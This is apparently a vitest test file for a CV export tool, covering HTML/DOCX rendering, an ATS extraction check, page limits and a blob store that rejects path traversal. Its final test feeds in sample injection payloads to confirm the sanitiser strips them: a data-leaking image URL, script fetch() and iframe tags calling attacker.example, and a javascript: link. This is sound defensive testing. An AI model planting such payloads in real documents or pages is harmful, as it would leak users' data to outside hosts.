import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";

import { atsIssues } from "../src/export/ats";
import { pageLimit } from "../src/export/export";
import { FsBlobStore } from "../src/export/fs-blob";
import { markdownToDocx, markdownToHtml } from "../src/export/render";

const contact = {
	name: "Ada Example",
	email: "ada@example.test",
	phone: "+90 555 000 00 00",
	location: "Izmir, Turkey",
	linkedin: "linkedin.com/in/adaexample",
	website: "",
	github: "",
};
const cv = [
	"# Ada Example",
	"",
	"Izmir, Turkey · ada@example.test · +90 555 000 00 00 · linkedin.com/in/adaexample",
	"",
	"## Summary",
	"",
	"Engineer.",
	"",
	"## Experience",
	"",
	"### Senior Software Engineer — Brightloom",
	"*United States · Remote · Jan 2023 – Oct 2025*",
	"",
	"- Built things with TypeScript.",
].join("\n");
const goodText = `Ada Example Izmir, Turkey · ada@example.test · +90 555 000 00 00 · linkedin.com/in/adaexample SUMMARY Engineer. ${"x ".repeat(100)} EXPERIENCE Senior Software Engineer — Brightloom United States · Remote · Jan 2023 – Oct 2025 Built things with TypeScript.`;
const input = {
	kind: "cv" as const,
	markdown: cv,
	contact,
	records: [],
	keywords: ["TypeScript"],
	maxPages: 2,
};

describe("rendering", () => {
	it("renders HTML with the skill's print CSS and a DOCX file", async () => {
		const html = markdownToHtml(cv, "Ada CV");
		expect(html).toContain("@page");
		expect(html).toContain("<h3>Senior Software Engineer — Brightloom</h3>");
		const docx = await markdownToDocx(cv);
		expect(String.fromCharCode(docx[0] ?? 0, docx[1] ?? 0)).toBe("PK");
		expect(docx.byteLength).toBeGreaterThan(3000);
	});
});

describe("ATS check", () => {
	it("passes a well-formed extraction", () => {
		expect(atsIssues({ text: goodText, pages: 1 }, input)).toEqual([]);
	});

	it("flags empty text, too many pages, lost contact details, order and keywords", () => {
		expect(atsIssues({ text: "", pages: 1 }, input)[0]?.message).toMatch(
			/Almost no text/,
		);
		const messages = atsIssues(
			{
				text: `EXPERIENCE Senior Software Engineer — Brightloom ${"x ".repeat(100)} Ada Example SUMMARY`,
				pages: 3,
			},
			input,
		).map((i) => i.message);
		expect(messages).toEqual(
			expect.arrayContaining([
				"The PDF has 3 pages; the limit is 2.",
				"The email is not readable text in the PDF.",
				"The name is not the first thing a parser reads.",
				'Section "experience" is read out of order.',
				'Role "Senior Software Engineer — Brightloom" does not read as title, company and dates together.',
				"Keywords lost in extraction: TypeScript.",
			]),
		);
	});

	it("allows two pages only for senior roles", () => {
		expect(pageLimit("cv", "Senior Engineer")).toBe(2);
		expect(pageLimit("cv", "Software Engineer")).toBe(1);
		expect(pageLimit("cover_letter", "Senior Engineer")).toBe(1);
	});
});

describe("local blob store", () => {
	it("round-trips and refuses keys outside its root", async () => {
		const store = new FsBlobStore(await mkdtemp(join(tmpdir(), "blobs-")));
		await store.put("users/u1/a.pdf", new Uint8Array([1, 2, 3]));
		expect(await store.get("users/u1/a.pdf")).toEqual(
			new Uint8Array([1, 2, 3]),
		);
		expect(await store.get("users/u1/missing.pdf")).toBeNull();
		await expect(store.put("../escape.pdf", new Uint8Array())).rejects.toThrow(
			/escapes/,
		);
	});
});

describe("markdownToHtml with untrusted Markdown", () => {
	it("drops images and raw HTML, so nothing in the document can fetch a URL", () => {
		const html = markdownToHtml(
			[
				"# Ada Example",
				"",
				"![x](https://attacker.example/leak?profile=secret)",
				"",
				'<img src="https://attacker.example/raw">',
				"",
				"<script>fetch('https://attacker.example/js')</script>",
				"",
				'Text with <iframe src="https://attacker.example/frame"></iframe> inline.',
				"",
				"[site](javascript:alert(1)) and [ok](https://example.com/ok)",
			].join("\n"),
			"t",
		);
		expect(html).not.toMatch(/<img|<script|<iframe|src=/i);
		expect(html).not.toContain("javascript:");
		expect(html).toContain('href="https://example.com/ok"');
		expect(html).toContain("Text with");
	});
});
